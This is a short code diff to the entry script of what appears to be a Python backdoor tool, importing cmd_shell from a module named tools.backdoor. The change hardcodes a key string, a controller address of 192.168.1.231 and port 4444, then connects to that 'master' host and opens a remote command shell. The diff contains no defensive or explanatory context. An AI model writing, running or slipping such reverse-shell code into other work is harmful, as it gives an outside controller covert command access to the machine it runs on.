@@ -2,12 +2,10 @@ from utils.connection import connect_master
 from tools.backdoor import cmd_shell
 
 
-KEY = ""
-master_hostname = ""
-master_port = ""
-
-
 if __name__ == "__main__":
-    global KEY, master_hostname, master_port
+    key = "wabbalabbadabbdabb"
+    KEY = bytes(key, 'utf-8')
+    master_hostname = "192.168.1.231"
+    master_port = 4444
     conn = connect_master(master_hostname, master_port)
-    cmd_shell(conn, master_hostname, master_port)
+    cmd_shell(conn, master_hostname, master_port, KEY)
